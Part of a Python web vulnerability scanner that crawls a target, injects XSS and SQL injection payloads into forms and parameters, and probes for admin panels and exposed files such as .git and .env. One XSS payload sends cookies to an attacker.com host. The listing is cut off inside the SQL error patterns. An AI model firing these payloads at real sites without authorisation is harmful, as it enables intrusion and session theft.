#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Web Vulnerability Scanner
Author: Abdul Haseeb (@h4x33b)
Version: 1.0.0
Description: A comprehensive web application vulnerability scanner that checks for
             common web vulnerabilities including XSS, SQL injection, CSRF, and more.
             This tool is designed for educational purposes and ethical security testing.
"""

import argparse
import requests
import sys
import time
import random
import re
import urllib.parse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ASCII Art Banner
BANNER = """
 __      __      ___.    __      __    .__                       ___.   .__.__  .__  __         
/  \    /  \ ____\_ |__ /  \    /  \__ |  |   ____   ___________\_ |__ |__|  | |__|/  |_ ___.__.
\   \/\/   // __ \| __ \\\\   \/\/   /  |  |  /    \ /  ___/\__  \| __ \|  |  | |  \   __<   |  |
 \        /\  ___/| \_\ \\\\        /|  |  |_|   |  \\\\___ \  / __ \| \_\ \  |  |_|  ||  |  \___  |
  \__/\  /  \___  >___  / \__/\  / |__|____/___|  /____  >(____  /___  /__|____/__||__|  / ____|
       \/       \/    \/       \/               \/     \/      \/    \/                  \/     
                                                                                                
 _________                                                                                       
/   _____/ ____ _____    ____   ____   ___________                                              
\_____  \_/ ___\\\\__  \  /    \ /    \_/ __ \_  __ \                                             
/        \  \___ / __ \|   |  \   |  \  ___/|  | \/                                             
/_______  /\___  >____  /___|  /___|  /\___  >__|                                               
        \/     \/     \/     \/     \/     \/                                                   
                                                                By: Abdul Haseeb (@h4x33b)
"""

# User agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
]

# XSS payloads for testing
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
    "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>"
]

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "') OR ('1'='1",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' OR ''='",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR 1=1--",
    "') OR 1=1#",
    "') OR 1=1/*",
    "1') OR ('1'='1",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR '1'='1'#",
    "admin' OR '1'='1'/*",
    "admin')",
    "admin') OR ('1'='1",
    "1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
]

# Common directories to check
COMMON_DIRS = [
    "admin/",
    "administrator/",
    "login/",
    "wp-admin/",
    "cp/",
    "dashboard/",
    "backend/",
    "control/",
    "member/",
    "portal/",
    "webadmin/",
    "adminarea/",
    "bb-admin/",
    "adminLogin/",
    "admin_area/",
    "panel-administracion/",
    "instadmin/",
    "memberadmin/",
    "administratorlogin/",
    "adm/",
    "account/",
    "controlpanel/",
    "admincontrol/",
    "joomla/administrator/",
    "admin.php",
    "admin.html",
    "admin.asp",
    "admin.aspx",
    "wp-login.php",
    "administrator.php",
    "administrator.html",
    "administrator.asp",
    "administrator.aspx",
    "login.php",
    "login.html",
    "login.asp",
    "login.aspx",
    "modelsearch/login.php",
    "moderator.php",
    "moderator.html",
    "moderator.asp",
    "moderator.aspx",
    "controlpanel.php",
    "controlpanel.html",
    "controlpanel.asp",
    "controlpanel.aspx",
    "panel.php",
    "panel.html",
    "panel.asp",
    "panel.aspx",
    "cp.php",
    "cp.html",
    "cp.asp",
    "cp.aspx",
    "admincp/",
    "moderatorcp/",
    "adminare/",
    "admins/",
    "fileadmin/",
    "sysadmin/",
    "yonetim.php",
    "yonetim.html",
    "yonetici.php",
    "yonetici.html",
    "phpmyadmin/",
    "myadmin/",
    "ur-admin/",
    "Server/",
    "wp-admin/",
    "administr8/",
    "webmaster/",
    "configuration/",
    "manage/",
    "manager/",
    "superuser/",
    "access/",
    "root/",
    "supervisor/",
    "phpMyAdmin/",
    "server-status/",
    ".git/",
    ".env",
    "backup/",
    "backups/",
    "dump/",
    "db/",
    "database/",
    "logs/",
    "tmp/",
    "temp/",
    "administrator/index.php"
]

class WebVulnScanner:
    def __init__(self, target_url, cookies=None, headers=None, timeout=10, threads=10, 
                 verbose=False, output=None, check_xss=True, check_sqli=True, 
                 check_dirs=True, check_headers=True, user_input=None):
        self.target_url = self.normalize_url(target_url)
        self.cookies = self.parse_cookies(cookies) if cookies else {}
        self.headers = self.parse_headers(headers) if headers else {}
        self.timeout = timeout
        self.threads = threads
        self.verbose = verbose
        self.output = output
        self.check_xss = check_xss
        self.check_sqli = check_sqli
        self.check_dirs = check_dirs
        self.check_headers = check_headers
        self.user_input = user_input
        
        # Add a random user agent if not specified
        if 'User-Agent' not in self.headers:
            self.headers['User-Agent'] = random.choice(USER_AGENTS)
            
        self.session = requests.Session()
        self.forms = []
        self.links = set()
        self.vulnerabilities = []
        
    def normalize_url(self, url):
        """Ensure URL has a scheme"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
        
    def parse_cookies(self, cookies_str):
        """Parse cookies from string format"""
        cookies = {}
        if cookies_str:
            for cookie in cookies_str.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookies[name] = value
        return cookies
        
    def parse_headers(self, headers_str):
        """Parse headers from string format"""
        headers = {}
        if headers_str:
            for header in headers_str.split('\n'):
                if ':' in header:
                    name, value = header.strip().split(':', 1)
                    headers[name.strip()] = value.strip()
        return headers
        
    def log(self, message, level="INFO"):
        """Log messages based on verbosity"""
        if self.verbose or level != "INFO":
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            print(f"[{timestamp}] [{level}] {message}")
            
    def request(self, url, method="GET", data=None, params=None, follow_redirects=True):
        """Make HTTP request with error handling"""
        try:
            if method.upper() == "GET":
                response = self.session.get(
                    url, 
                    params=params,
                    cookies=self.cookies,
                    headers=self.headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=follow_redirects
                )
            else:  # POST
                response = self.session.post(
                    url, 
                    data=data,
                    cookies=self.cookies,
                    headers=self.headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=follow_redirects
                )
            return response
        except requests.exceptions.RequestException as e:
            self.log(f"Request error: {e}", "ERROR")
            return None
            
    def extract_forms(self, response):
        """Extract forms from response"""
        forms = []
        if response and response.text:
            soup = BeautifulSoup(response.text, 'html.parser')
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                
                # Handle relative URLs
                if form_info['action'] and not form_info['action'].startswith(('http://', 'https://')):
                    if form_info['action'].startswith('/'):
                        base_url = '/'.join(self.target_url.split('/')[:3])  # http(s)://domain.com
                        form_info['action'] = base_url + form_info['action']
                    else:
                        form_info['action'] = self.target_url.rstrip('/') + '/' + form_info['action']
                
                # If action is empty, use the current URL
                if not form_info['action']:
                    form_info['action'] = response.url
                
                # Extract form inputs
                for input_field in form.find_all(['input', 'textarea', 'select']):
                    input_type = input_field.get('type', '')
                    input_name = input_field.get('name', '')
                    input_value = input_field.get('value', '')
                    
                    if input_name:  # Only include inputs with names
                        form_info['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_info)
        return forms
        
    def extract_links(self, response):
        """Extract links from response"""
        links = set()
        if response and response.text:
            soup = BeautifulSoup(response.text, 'html.parser')
            base_url = '/'.join(self.target_url.split('/')[:3])  # http(s)://domain.com
            
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                
                # Skip empty links, javascript, and anchors
                if not href or href.startswith(('javascript:', '#', 'mailto:', 'tel:')):
                    continue
                    
                # Handle relative URLs
                if not href.startswith(('http://', 'https://')):
                    if href.startswith('/'):
                        href = base_url + href
                    else:
                        href = self.target_url.rstrip('/') + '/' + href
                
                # Only include links from the same domain
                if base_url in href:
                    links.add(href)
                    
        return links
        
    def crawl(self, url=None, depth=1):
        """Crawl the website to discover content"""
        if not url:
            url = self.target_url
            
        self.log(f"Crawling: {url}")
        response = self.request(url)
        
        if not response:
            return
            
        # Extract forms and links
        forms = self.extract_forms(response)
        links = self.extract_links(response)
        
        # Add forms to the list
        for form in forms:
            if form not in self.forms:
                self.forms.append(form)
                
        # Add links to the set
        self.links.update(links)
        
        # Recursively crawl links up to the specified depth
        if depth > 1:
            for link in links:
                if link not in self.links:
                    self.crawl(link, depth - 1)
                    
    def check_xss_vulnerability(self, url, params=None, data=None, method="GET"):
        """Check for XSS vulnerabilities"""
        for payload in XSS_PAYLOADS:
            if params:
                # Test each parameter
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    response = self.request(url, method=method, params=test_params if method == "GET" else None, 
                                           data=test_params if method == "POST" else None)
                    
                    if response and payload in response.text:
                        self.log(f"Potential XSS found at {url} with parameter {param}", "VULN")
                        self.vulnerabilities.append({
                            'type': 'XSS',
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f"Payload was reflected in the response"
                        })
            
            if data:
                # Test each parameter in form data
                for param in data:
                    test_data = data.copy()
                    test_data[param] = payload
                    
                    response = self.request(url, method=method, data=test_data)
                    
                    if response and payload in response.text:
                        self.log(f"Potential XSS found at {url} with parameter {param}", "VULN")
                        self.vulnerabilities.append({
                            'type': 'XSS',
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f"Payload was reflected in the response"
                        })
                        
    def check_sqli_vulnerability(self, url, params=None, data=None, method="GET"):
        """Check for SQL Injection vulnerabilities"""
        # SQL error patterns to look for
        sql_errors = [
            "SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result", "MySqlClient\\.",
            "PostgreSQL.*ERROR", "Warning.*pg_.*", "valid PostgreSQL result", "Npgsql\\.",
            "Driver.* SQL[-_ ]*Server", "OLE DB.* SQL Server", "\\bSQL Server.*Driver", "Warning.*mssql_.*",
            "\\bSQL Server.*[0-9a-fA-F]{8}", "(?i)Microsoft Access Driver", "JET Database Engine", "Access Database Engine",
            "ODBC.*Driver.*\\b(SQL Server|Oracle|MySQL|PostgreSQL|SQLite)", "\\bORA-[0-9][0-9][0-9][0-9]", "Oracle error",
            "Oracle.*Driver", "Warning.*oci_.*", "Warning.*ora_.*",
            "CLI Driver.*DB2", "DB2 SQL error", "\\bdb2_\\w+\\(",
            "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException", "Warning.*sqlite_.*",
            "Warning.*SQLite3::", "\\[SQLITE_ERROR\\]",
            "Syntax error or access violation", "Unexpected end of SQL command", "Error in query syntax"
<response clipped><NOTE>To save on context only part of this file has been shown to you. You should retry this tool after you have searched inside the file with `grep -n` in order to find the line numbers of what you are looking for.</NOTE>